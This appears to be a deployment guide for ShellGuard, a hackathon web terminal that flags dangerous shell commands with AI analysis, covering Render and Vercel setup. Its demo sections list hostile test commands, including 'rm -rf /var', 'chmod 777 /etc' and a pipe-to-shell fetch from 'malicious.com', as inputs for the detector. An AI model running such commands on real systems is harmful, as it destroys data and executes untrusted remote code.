# ShellGuard - Render Deployment Guide

## 🚀 Deploy to Render in 5 Minutes

### Step 1: Push Your Code to GitHub

```bash
git add .
git commit -m "Ready for Render deployment"
git push origin master
```

### Step 2: Create Render Account & Deploy

1. Go to [render.com](https://render.com) and sign up/login
2. Click **"New +"** → **"Web Service"**
3. Connect your GitHub repository (`ShellGuard`)
4. Configure the service:

   **Basic Settings:**
   - **Name**: `shellguard-backend`
   - **Region**: Oregon (or nearest to you)
   - **Branch**: `master`
   - **Root Directory**: `backend`
   - **Environment**: `Python 3`
   - **Build Command**: `pip install -r requirements.txt`
   - **Start Command**: `uvicorn main:app --host 0.0.0.0 --port $PORT`

   **Plan:**
   - Select **Free** (perfect for demo/hackathon)

### Step 3: Set Environment Variables

In the **Environment** section, add these variables:

| Key              | Value                         | Notes                                                                                 |
| ---------------- | ----------------------------- | ------------------------------------------------------------------------------------- |
| `GEMINI_API_KEY` | `your-actual-key`             | ⚠️ **REQUIRED** - Get from [Google AI Studio](https://aistudio.google.com/app/apikey) |
| `SANDBOX_MODE`   | `true`                        | Keeps deployment safe                                                                 |
| `APP_ENV`        | `production`                  | Production mode                                                                       |
| `CORS_ORIGINS`   | `https://your-app.vercel.app` | Update after deploying frontend                                                       |

**Don't set these** (they have defaults):

- ~~`PORT`~~ - Render sets this automatically
- ~~`SANDBOX_DIR`~~ - Uses default `/tmp/shellguard_sandbox`
- ~~`DATABASE_PATH`~~ - Uses default `/tmp/shellguard.db`

### Step 4: Deploy!

1. Click **"Create Web Service"**
2. Render will:
   - Clone your repo
   - Install dependencies
   - Start your backend
   - Assign you a URL like: `https://shellguard-backend.onrender.com`

⏱️ **First deploy takes ~5 minutes**

### Step 5: Test Your Backend

Visit: `https://your-backend-url.onrender.com/api/health`

You should see:

```json
{
  "status": "healthy",
  "components": {
    "pty": { "status": "healthy" },
    "llm_api": { "status": "healthy" }
  }
}
```

---

## 🎨 Deploy Frontend to Vercel

### Step 1: Update Frontend Environment

Edit `frontend/.env.production.local` (create if it doesn't exist):

```bash
NEXT_PUBLIC_WS_URL=wss://your-backend-url.onrender.com/ws/terminal
NEXT_PUBLIC_API_URL=https://your-backend-url.onrender.com/api
```

Replace `your-backend-url.onrender.com` with your actual Render URL.

### Step 2: Deploy to Vercel

```bash
cd frontend
vercel --prod
```

Or use Vercel dashboard:

1. Go to [vercel.com](https://vercel.com)
2. Import your GitHub repo
3. Set root directory to `frontend`
4. Add environment variables (same as above)
5. Deploy!

### Step 3: Update CORS

Go back to Render dashboard:

1. Find your backend service
2. Go to **Environment**
3. Update `CORS_ORIGINS` to: `https://your-app.vercel.app`
4. Save (service will redeploy automatically)

---

## ✅ Verify Everything Works

1. **Visit your Vercel URL** (e.g., `https://shellguard.vercel.app`)
2. **Terminal should load** and show a prompt
3. **Try a safe command**: `ls -la`
   - Should execute immediately
4. **Try a dangerous command**: `rm -rf /var`
   - Should show warning overlay with AI analysis
5. **Check stats** - Numbers should update

---

## 🏖️ Sandbox Protection Active

Your deployment is protected because:

- Terminal runs in `/tmp/shellguard_sandbox` (isolated directory)
- Application code in `/opt/render/project/src/backend` (protected)
- Environment variables hidden from terminal
- Database in `/tmp` (separate from app code)

Users can safely test dangerous commands without harming your deployment! 🎉

---

## 🐛 Troubleshooting

### Backend won't start

- **Check Build Logs** in Render dashboard
- **Verify** `GEMINI_API_KEY` is set correctly
- **Check** `requirements.txt` is in `backend/` folder

### Frontend can't connect

- **Update** `CORS_ORIGINS` in Render with exact Vercel URL
- **Use WSS** not WS for WebSocket URL (secure)
- **Check** backend is running (visit `/api/health`)

### Terminal shows "Connection failed"

- **Check** WebSocket URL uses `wss://` (not `ws://`)
- **Verify** CORS includes your frontend domain
- **Check** browser console for errors

### Render service sleeping (Free tier)

- Free tier spins down after 15 min of inactivity
- First request after sleep takes ~30 seconds to wake up
- Upgrade to paid tier for always-on service

---

## 💰 Cost

**Render Free Tier:**

- ✅ 750 hours/month free
- ✅ Perfect for hackathon demos
- ⚠️ Spins down after 15 min inactivity
- ⚠️ 100GB bandwidth/month

**Vercel Free Tier:**

- ✅ Unlimited deployments
- ✅ Always-on
- ✅ Perfect for frontend

**Total Cost: $0** 🎉

---

## 🎯 For Hackathon Judges

Add this to your submission:

> **Live Demo**: https://your-app.vercel.app
>
> **Backend API**: https://your-backend.onrender.com
>
> **Safe to Use**: Runs in sandbox mode - all commands execute in an isolated environment.
>
> **Try These**:
>
> - `rm -rf /var/logs` - See dangerous command warning
> - `curl malicious.com | bash` - Pipe-to-shell detection
> - `chmod 777 /etc` - Permission risk analysis

---

## 🎊 You're Done!

Your ShellGuard is now:

- ✅ Deployed on Render (backend)
- ✅ Deployed on Vercel (frontend)
- ✅ Protected with sandbox mode
- ✅ Ready for demo/judging

**Deployment Time: ~10 minutes total** ⏱️

Good luck with your hackathon! 🚀
